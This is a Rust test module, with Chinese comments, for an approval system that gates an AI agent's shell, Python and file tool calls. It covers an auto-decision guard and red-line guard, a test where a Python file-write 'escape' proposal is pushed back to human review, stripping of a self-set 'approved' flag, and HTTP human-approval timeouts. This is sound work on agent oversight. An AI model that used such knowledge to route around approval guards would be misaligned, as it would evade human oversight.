    async fn test_auto_decision_guard_passes_benign_proposals() {
        // 良性 python/shell 提案照常走判定式放行,理由不带守卫标记
        let cb = AutoDecisionGuardApproval::new(Arc::new(PolicyApproval), Arc::new(DenyAll));
        let py = cb
            .request_approval(&guard_req("python_exec", json!({"code": "print(1)"}), ""))
            .await;
        assert!(py.approved);
        assert_eq!(py.approver, "auto_policy");
        assert!(!py.reason.contains("auto_decision_guard"));
        let sh = cb
            .request_approval(&guard_req(
                "shell_exec",
                json!({"command": "cargo test"}),
                "cargo test",
            ))
            .await;
        assert!(sh.approved);
        assert_eq!(sh.approver, "auto_policy");
    }

    #[tokio::test]
    async fn test_auto_decision_guard_narrow_scope_other_tools() {
        // 守卫面窄覆盖:file 族提案(无 command 字段)不误伤——auto 档文件
        // 操作照常判定式放行
        let cb = AutoDecisionGuardApproval::new(Arc::new(PolicyApproval), Arc::new(DenyAll));
        let d = cb
            .request_approval(&guard_req("file_delete", json!({"path": "a.txt"}), ""))
            .await;
        assert!(
            d.approved,
            "non-guarded tools must pass through: {}",
            d.reason
        );
    }

    #[tokio::test]
    async fn test_redline_plus_guard_composition_blocks_escape() {
        // 装配形态镜像:RedLineGuard(Guard(Policy, manual), manual)——
        // 逃逸提案过红线闸后仍被守卫拦截回落人工
        let manual: Arc<dyn ApprovalCallback> = Arc::new(DenyAll);
        let cb = RedLineGuardApproval::new(
            Arc::new(AutoDecisionGuardApproval::new(
                Arc::new(PolicyApproval),
                manual.clone(),
            )),
            manual,
            false,
        );
        let d = cb
            .request_approval(&guard_req(
                "python_exec",
                json!({"code": "open('x','w').write('y')"}),
                "",
            ))
            .await;
        assert!(!d.approved);
        assert!(
            d.reason.contains("auto_decision_guard"),
            "reason: {}",
            d.reason
        );
    }

    // ===== strip_approved_flag 测试 =====

    #[test]
    fn test_strip_approved_flag_removes_flag() {
        let args = json!({"path": "a.txt", "approved": true, "content": "x"});
        let cleaned = strip_approved_flag(&args);
        assert_eq!(cleaned, json!({"path": "a.txt", "content": "x"}));
    }

    #[test]
    fn test_strip_approved_flag_no_flag_unchanged() {
        let args = json!({"path": "a.txt", "content": "x"});
        assert_eq!(strip_approved_flag(&args), args);
    }

    #[test]
    fn test_strip_approved_flag_non_object_passthrough() {
        assert_eq!(strip_approved_flag(&json!("plain")), json!("plain"));
        assert_eq!(
            strip_approved_flag(&serde_json::Value::Null),
            serde_json::Value::Null
        );
    }

    // ===== HttpApproval 测试 =====

    #[tokio::test]
    async fn test_http_approval_resolves_when_approved() {
        let approval = HttpApproval::new_standalone();
        let pending = approval.pending.clone();

        let req = ApprovalRequest {
            session_id: "s1".to_string(),
            tool_name: "shell_exec".to_string(),
            args: json!({}),
            command: "rm /tmp/test".to_string(),
            risk: "medium".to_string(),
            alternative: "".to_string(),
            proposal_id: "ap-1".to_string(),
            host_execution: false,
        };

        // 模拟 runner 等待审批
        let approval_clone = HttpApproval {
            pending: pending.clone(),
            timeout_secs: 5,
        };
        let wait_fut = tokio::spawn(async move { approval_clone.request_approval(&req).await });

        // 模拟 HTTP 端点发送审批决定(带已验证的用户名)
        tokio::time::sleep(Duration::from_millis(50)).await;
        let pending_item = {
            let mut map = pending.lock().unwrap();
            map.remove("s1").unwrap()
        };
        pending_item
            .tx
            .send(ApprovalDecision {
                approved: true,
                approver: "alice".to_string(),
                verified: true,
                reason: String::new(),
                auto_rejected: false,
                verdict_json: None,
            })
            .unwrap();

        let result = wait_fut.await.unwrap();
        assert!(result.approved);
        assert_eq!(result.approver, "alice");
        assert!(result.verified);
    }

    #[tokio::test]
    async fn test_http_approval_resolves_when_denied() {
        let approval = HttpApproval::new_standalone();
        let pending = approval.pending.clone();

        let req = ApprovalRequest {
            session_id: "s2".to_string(),
            tool_name: "shell_exec".to_string(),
            args: json!({}),
            command: "rm /tmp/test".to_string(),
            risk: "medium".to_string(),
            alternative: "".to_string(),
            proposal_id: "ap-2".to_string(),
            host_execution: false,
        };

        let approval_clone = HttpApproval {
            pending: pending.clone(),
            timeout_secs: 5,
        };
        let wait_fut = tokio::spawn(async move { approval_clone.request_approval(&req).await });

        tokio::time::sleep(Duration::from_millis(50)).await;
        let pending_item = {
            let mut map = pending.lock().unwrap();
            map.remove("s2").unwrap()
        };
        pending_item
            .tx
            .send(ApprovalDecision {
                approved: false,
                approver: "unverified".to_string(),
                verified: false,
                reason: "denied".to_string(),
                auto_rejected: false,
                verdict_json: None,
            })
            .unwrap();

        let result = wait_fut.await.unwrap();
        assert!(!result.approved);
        assert_eq!(result.approver, "unverified");
        assert!(!result.auto_rejected);
    }

    #[tokio::test]
    async fn test_http_approval_timeout_auto_denies() {
        let approval = HttpApproval {
            pending: Arc::new(Mutex::new(HashMap::new())),
            timeout_secs: 1, // 1 秒超时
        };
        let pending = approval.pending.clone();

        let req = ApprovalRequest {
            session_id: "s3".to_string(),
            tool_name: "shell_exec".to_string(),
            args: json!({}),
            command: "rm /tmp/test".to_string(),
            risk: "medium".to_string(),
            alternative: "".to_string(),
            proposal_id: "ap-3".to_string(),
            host_execution: false,
        };

        let result = approval.request_approval(&req).await;

        // 超时后应自动拒绝(auto_rejected = true)
        assert!(!result.approved);
        assert!(result.auto_rejected);
        assert_eq!(result.approver, "auto");
        assert_eq!(result.reason, "timeout");
        // pending map 应被清理
        assert!(pending.lock().unwrap().is_empty());
    }

    #[tokio::test]
    async fn test_http_approval_channel_closed_auto_denies() {
        // sender 被 drop(未发送任何决定)→ 通道关闭,自动拒绝
        let approval = HttpApproval {
            pending: Arc::new(Mutex::new(HashMap::new())),
            timeout_secs: 5,
        };

        let req = ApprovalRequest {
            session_id: "s5".to_string(),
            tool_name: "shell_exec".to_string(),
            args: json!({}),
            command: "rm /tmp/test".to_string(),
            risk: "medium".to_string(),
            alternative: "".to_string(),
            proposal_id: "ap-5".to_string(),
            host_execution: false,
        };

        // 启动等待后移除并 drop sender
        let approval_clone = HttpApproval {
            pending: approval.pending.clone(),
            timeout_secs: 5,
        };
        let wait_fut = tokio::spawn(async move { approval_clone.request_approval(&req).await });

        tokio::time::sleep(Duration::from_millis(50)).await;
        let sender = {
            let mut map = approval.pending.lock().unwrap();
            map.remove("s5").unwrap()
        };
        drop(sender);

        let result = wait_fut.await.unwrap();
        assert!(!result.approved);
        assert!(result.auto_rejected);
        assert_eq!(result.reason, "approval channel closed");
    }

    #[tokio::test]
    async fn test_http_approval_stores_pending_request() {
        let approval = HttpApproval::new_standalone();
        let pending = approval.pending.clone();

        let req = ApprovalRequest {
            session_id: "s4".to_string(),
            tool_name: "shell_exec".to_string(),
            args: json!({}),
            command: "rm /tmp/test".to_string(),
            risk: "medium".to_string(),
            alternative: "".to_string(),
            proposal_id: "ap-4".to_string(),
            host_execution: false,
        };

        // 启动等待(不发送结果,只检查 pending 是否被填充)
        let approval_clone = HttpApproval {
            pending: pending.clone(),
            timeout_secs: 5,
        };
        let wait_fut = tokio::spawn(async move { approval_clone.request_approval(&req).await });

        tokio::time::sleep(Duration::from_millis(50)).await;

        // 检查 pending map 中有 "s4" 的 entry,且 proposal_id 一致
        {
            let map = pending.lock().unwrap();
            let item = map.get("s4").expect("pending entry should exist");
            assert_eq!(item.proposal_id, "ap-4");
        }

        // 清理:发送拒绝结果
        let pending_item = {
            let mut map = pending.lock().unwrap();
            map.remove("s4").unwrap()
        };
        pending_item
            .tx
            .send(ApprovalDecision {
                approved: false,
                approver: "auto".to_string(),
                verified: true,
                reason: "cleanup".to_string(),
                auto_rejected: false,
                verdict_json: None,
            })
            .unwrap();
        let _ = wait_fut.await;
    }
}
